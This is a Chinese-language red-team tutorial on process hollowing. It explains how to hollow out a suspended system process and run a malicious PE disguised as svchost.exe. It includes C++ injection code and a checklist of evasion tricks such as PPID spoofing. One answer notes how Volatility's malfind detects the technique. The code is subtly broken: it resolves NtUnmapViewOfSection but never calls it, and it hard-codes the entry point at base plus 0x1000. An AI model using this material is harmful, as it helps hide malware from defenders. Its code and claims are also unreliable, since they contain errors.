## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**進程鏤空 Process Hollowing 與隱蔽注入實施** 的物理本質為**以掛起 (CREATE_SUSPENDED) 狀態啟動一個合法的系統二進位程序（如 `svchost.exe` 或 `explorer.exe`），隨後透過記憶體解映射 API (`NtUnmapViewOfSection`) 將目標進程原有的合法 PE 鏡像從記憶體中徹底掏空，並將惡意代碼重新寫入並修補進程環境塊 (PEB) 中的入口點 (AddressOfEntryPoint)，最後恢復執行緒 (ResumeThread)**。在紅隊實戰中，該技術使得惡意載荷能完全借殼於白名單系統進程中運行，在工作管理員與進程樹檢視下完美偽裝為合法微軟服務。

## 🔬 第一動：PE 結構、進程掛起與記憶體解映射物理機制 (Mechanics & PE Loader)

### 1. 進程鏤空的四步核心調用鏈
1. **進程創建 (Creation)**：
   調用 `CreateProcessA(..., CREATE_SUSPENDED, ...)`，此時核心已為進程分配虛擬記憶體並加載了 `ntdll.dll`，但主執行緒尚未開始執行。
2. **掏空原始模組 (Hollowing)**：
   調用 `NtUnmapViewOfSection(hProcess, pBaseAddress)`，卸載原始執行檔的記憶體映射。
3. **記憶體重建與寫入 (Allocation & Writing)**：
   調用 `VirtualAllocEx()` 分配可讀寫執行空間，依序將惡意 PE 的 Headers 與各個 Sections 寫入目標位址空間。
4. **上下文切換 (Context Hijacking)**：
   調用 `GetThreadContext()` 獲取執行緒暫存器，將 `rcx` (x64) 或 `eax` (x86) 替換為惡意 PE 的入口點 (`AddressOfEntryPoint`)，隨後調用 `SetThreadContext()` 並 `ResumeThread()`。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. C++ 實戰進程鏤空核心實作代碼
```cpp
// process_hollowing.cpp 核心邏輯
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(HANDLE, PVOID);

void HollowProcess(LPCSTR targetPath, PVOID payloadBuffer, DWORD payloadSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // 1. 以掛起狀態啟動合法進程
    CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // 2. 獲取 NtUnmapViewOfSection 並卸載原始模組
    pfnNtUnmapViewOfSection NtUnmapViewOfSection = (pfnNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    
    // 3. 在目標進程分配記憶體並寫入新 PE
    PVOID remoteBase = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteBase, payloadBuffer, payloadSize, NULL);
    
    // 4. 修改執行緒上下文並恢復執行
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)remoteBase + 0x1000; // 入口點偏移
    SetThreadContext(pi.hThread, &ctx);
    
    ResumeThread(pi.hThread);
}
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：進程鏤空 (Process Hollowing) 與傳統 DLL 注入相比，最大的防禦規避特徵是什麼？**
  - **戰術思維**：傳統 DLL 注入會在目標進程加載一個未簽名的可疑 DLL 模組；而進程鏤空直接掏空了合法主模組，外觀上完全就是被借殼的合法程序，進程模組列表極為乾淨。
- [ ] **Q2：在實施進程鏤空時，為何必須以 `CREATE_SUSPENDED` 狀態啟動進程？**
  - **戰術思維**：確保主執行緒在初始化前被凍結，防止進程執行原有合法邏輯；同時讓攻擊者有充裕時間卸載記憶體、重寫 PE 結構並修改暫存器入口點。
- [ ] **Q3：什麼是 PPID (Parent Process ID) 欺騙？它如何輔助進程鏤空規避偵測？**
  - **戰術思維**：普通進程直接衍生 `svchost.exe` 會在進程樹中暴露出異常的父子關係；PPID 欺騙透過 Win32 API 偽造父進程為 `services.exe`，使進程樹結構 100% 合理化。
- [ ] **Q4：藍隊記憶體取證工具（如 Volatility）如何識別被鏤空的進程？**
  - **戰術思維**：使用 `malfind` 插件比對進程 VAD 樹與物理磁碟檔案，若發現進程記憶體中標記為可執行且未對應到磁碟檔案的頁面，即可判定為進程鏤空。
- [ ] **Q5：現代紅隊為了規避 `NtUnmapViewOfSection` 監控，發展出何種替代技術？**
  - **戰術思維**：發展出 Process Doppelgänging（利用 NTFS 事務機制）與 Process Herpaderping（在檔案落地與記憶體映射之間操縱磁碟內容），避開卸載 API 調用。
